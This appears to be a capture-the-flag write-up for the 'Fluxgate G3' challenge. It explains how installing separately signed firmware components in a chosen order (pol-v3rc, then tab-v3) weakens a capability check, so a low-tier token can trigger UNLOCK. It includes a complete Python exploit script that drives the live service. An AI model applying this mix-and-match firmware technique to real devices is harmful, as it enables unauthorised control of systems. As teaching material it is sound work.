### Summary

Firmware components (`pol`, `tab`, `rad`) are each signed and counter-checked, but nothing binds them into one signed release. Only the declared dependency version ranges connect them. Installing `pol-v3rc` first, which tolerates the installed `tab-v2`, and then `tab-v3` keeps every dependency range satisfied at each step. The result is a `tab` table where opcode `0x70` requires only `BASIC_READ` (`0x0001`) instead of `SERVICE` (`0x8000`), and `pol` maps `0x70` to `UNLOCK`. The default low-tier operator token carries `0x0003`, so a frame with opcode `0x70` triggers `UNLOCK` and returns the flag.

### Steps

The challenge is a live TCP service. Use the host and port from the challenge page (`nc <host> <port>`). The attachment `files/fluxgate-g3.zip` contains `docs/protocol.md`, `docs/artifact.md`, `tools/client.py` and the firmware in `artifacts/`. All commands below are run from the challenge root.

1. Extract the bundle and decode the firmware. Each `.fw` file uses the `FXG1` layout in `docs/artifact.md`: magic, component, version, security counter, build id, dependency list, payload, and a 64-byte Ed25519 signature. The `pol` payload maps opcodes to actions, the `tab` payload maps opcodes to required capability masks, and the `rad` payload gives the frame version. Comparing the decoded versions shows the asymmetry.
   ```sh
   unzip -o files/fluxgate-g3.zip -d work/scratch/extract
   ```
   - `pol-v3rc` (counter 3, deps `tab:1-3`, `rad:1-2`) maps opcode `0x70` to action `UNLOCK`.
   - `tab-v2` requires capability `0x8000` (`SERVICE`) for `0x70`.
   - `tab-v3` (counter 3, deps `pol:3-3`) requires only `0x0001` (`BASIC_READ`) for `0x70`.
   - The default operator token from `TOKEN` carries capabilities `0x0003` (`BASIC_READ | STATUS`), which already includes `0x0001`.

2. Read the installed set with `STATUS`. The factory state is `pol-v3` (deps `tab:2-2`, `rad:2-2`), `tab-v2` and `rad-v2`. Installing `tab-v3` directly would break `pol-v3`'s `tab:2-2` dependency, so `pol` has to move to `pol-v3rc` first. Its `tab:1-3` range still accepts `tab-v2`, so that update is accepted. After `tab-v3` is installed, `pol-v3rc`'s `tab:1-3` and `tab-v3`'s `pol:3-3` are both satisfied. The update order is:
   ```
   UPDATE <base64 of pol-v3rc.fw>   # counter 3 >= 3, sidegrade accepted
   UPDATE <base64 of tab-v3.fw>     # counter 3 >= 2, both dependency ranges hold
   BOOT                             # OK boot ok: pol@v3.03c1 tab@v3.1003 rad@v2.2002
   ```

3. Build a frame as described in `docs/protocol.md`. The fields are the magic `FG`, `frame_version = 2` (matching the installed `rad-v2`), `opcode = 0x70`, `payload_len = 0`, then the 24-byte operator token from `TOKEN`. The capability check for `0x70` now needs `0x0001`, which is a subset of the token's `0x0003`, so `pol-v3rc` dispatches `UNLOCK`.
   ```
   SEND <base64 of: "FG" + 0x02 0x70 0x00 + operator token>
   ```
   The response has a `resp_b64` field. Its decoded value is `unlock:isfcr{REDACTED}`.

The whole sequence is automated by `scripts/exploit.py` (see below). It needs only the host, the port and the bundle.

### Scripts

#### scripts/exploit.py

Runs the full sequence against the live service: `HELLO`, `STATUS`, `TOKEN`, `UPDATE pol-v3rc.fw`, `UPDATE tab-v3.fw`, `STATUS`, `BOOT`, and the `SEND` frame with opcode `0x70`. It reads the two firmware files straight out of the bundle and prints the transcript, with the flag in the last `SEND` response. Run it from the challenge root:
`python3 -I work/scripts/exploit.py <host> <port> files/fluxgate-g3.zip`. It uses only the standard library.

```python
#!/usr/bin/env python3
"""
Fluxgate G3 exploit: mix-and-match firmware versions to remap opcode 0x70
(UNLOCK in pol-v3rc) to required_mask 0x0001 (tab-v3), which the default
operator token (capabilities 0x0003) already satisfies.

Install order matters because dependency ranges are rechecked after every
UPDATE against the full installed set:
  1. UPDATE pol-v3rc  (same version/counter as pol-v3, but deps tab:1-3 are
     wide enough to still tolerate the currently-installed tab-v2)
  2. UPDATE tab-v3    (now pol-v3rc's tab:1-3 dep and tab-v3's pol:3-3 dep
     are both satisfied)
  3. BOOT
  4. SEND a frame with opcode 0x70 and the issued token -> UNLOCK fires.

Usage: exploit.py HOST PORT [ARTIFACT_ZIP]
  ARTIFACT_ZIP defaults to files/fluxgate-g3.zip (relative to the challenge
  root); pol-v3rc.fw and tab-v3.fw are extracted from it on the fly.
"""
import base64
import socket
import sys
import zipfile


def recv_until_quiet(sock, timeout=1.5):
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf.decode(errors="replace")


def send_cmd(sock, line):
    print(f">>> {line}")
    sock.sendall((line + "\n").encode())
    out = recv_until_quiet(sock)
    print(out, end="")
    return out


def b64_from_zip(zip_path, member):
    with zipfile.ZipFile(zip_path) as z:
        name = next(n for n in z.namelist() if n.endswith(member))
        return base64.b64encode(z.read(name)).decode()


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    zip_path = sys.argv[3] if len(sys.argv) > 3 else "files/fluxgate-g3.zip"
    s = socket.create_connection((host, port))

    recv_until_quiet(s)

    send_cmd(s, "HELLO")
    send_cmd(s, "STATUS")
    out = send_cmd(s, "TOKEN")

    token_b64 = None
    for l in out.splitlines():
        if "token_b64=" in l:
            token_b64 = l.strip().split("token_b64=", 1)[1]
    if not token_b64:
        print("Failed to get token"); sys.exit(1)
    token = base64.b64decode(token_b64)
    print(f"token ({len(token)} bytes): {token.hex()}")

    send_cmd(s, "UPDATE " + b64_from_zip(zip_path, "pol-v3rc.fw"))
    send_cmd(s, "UPDATE " + b64_from_zip(zip_path, "tab-v3.fw"))
    send_cmd(s, "STATUS")
    send_cmd(s, "BOOT")

    frame = b"FG" + bytes([2, 0x70, 0]) + token
    send_cmd(s, "SEND " + base64.b64encode(frame).decode())

    s.close()


if __name__ == "__main__":
    main()
```

### Notes

- The host and port are per-instance values. Reconnecting issues a fresh operator token and resets device state, because state is per connection (`docs/protocol.md`). Run the whole sequence in one connection.
- The install order is the whole trick. `UPDATE tab-v3` before `pol-v3rc` fails the `tab:2-2` dependency of the installed `pol-v3`.
- `work/scripts/parse_fw.py` is an analysis helper that decodes `FXG1` headers, dependencies and the `pol`/`tab`/`rad` payloads. It is how the opcode and mask asymmetry was found, but `exploit.py` does not import or call it, so it is not embedded here. Usage: `python3 -I work/scripts/parse_fw.py <file.fw> [...]`.
- The exploit does not forge signatures. Every firmware image is an original, signed file from the bundle, and the weakness is that the signatures bind components individually while the dependency ranges bind them loosely.
- `exploit.py` prints the transcript. Check that the `BOOT` reply reports `pol@v3.03c1 tab@v3.1003 rad@v2.2002` before reading the `SEND` response.
